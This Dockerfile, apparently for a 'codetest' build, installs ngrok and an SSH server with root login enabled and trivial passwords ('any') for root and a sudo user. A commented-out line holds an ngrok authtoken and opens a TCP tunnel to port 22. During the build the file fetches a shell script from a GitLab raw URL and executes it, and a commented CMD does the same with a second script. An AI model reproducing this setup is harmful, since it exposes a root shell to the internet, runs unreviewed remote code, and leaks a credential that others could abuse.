FROM ubuntu
# FROM  rishabhmodi2003/codetest:1
RUN sed -i 's/http:\/\/archive.ubuntu.com/http:\/\/mirror.xtom.com.hk/g' /etc/apt/sources.list
# Install ngrok
ENV NOTVISIBLE "in users profile"
RUN apt update -y && apt upgrade -y && apt install -y tar openssh-client curl openssh-server sudo python3 ffmpeg
RUN curl -Lk 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' > ngrok.tgz
RUN tar -xf ngrok.tgz && cp ngrok /bin&& rm -f ngrok.tgz
RUN echo 'inspect_addr: 0.0.0.0:4040' > /.ngrok
# Install sshd
EXPOSE 4040
RUN apt-get install -y openssh-server \
    && mkdir /var/run/sshd \
    && echo root:any | chpasswd \
    && sed -i 's/PermitRootLogin without-password/PermitRootLogin yes/' /etc/ssh/sshd_config \
    && sed 's@session\s*required\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd \
    && echo "export VISIBLE=now" >> /etc/profile \
    && mkdir -p /app \
    && sudo useradd -g sudo user \
    && echo user:any | chpasswd
#     && /usr/sbin/sshd && timeout 25m ngrok config add-authtoken 1ttZhgDBXTNa3xaGrFkI15bhnUp_3ZgG54Byr2RPeV64L3TJy && ngrok tcp 22
RUN echo 'caro build'
RUN apt install rclone && curl https://gitlab.com/rishabh-modi2/public/-/raw/main/cmd.sh -o /app/cmd.sh && chmod 777 /app/cmd.sh && /app/cmd.sh
CMD echo 'hi'
# CMD wget https://gitlab.com/rishabh-modi2/public/-/raw/main/codetest.sh && chmod 777 codetest.sh && ./codetest.sh
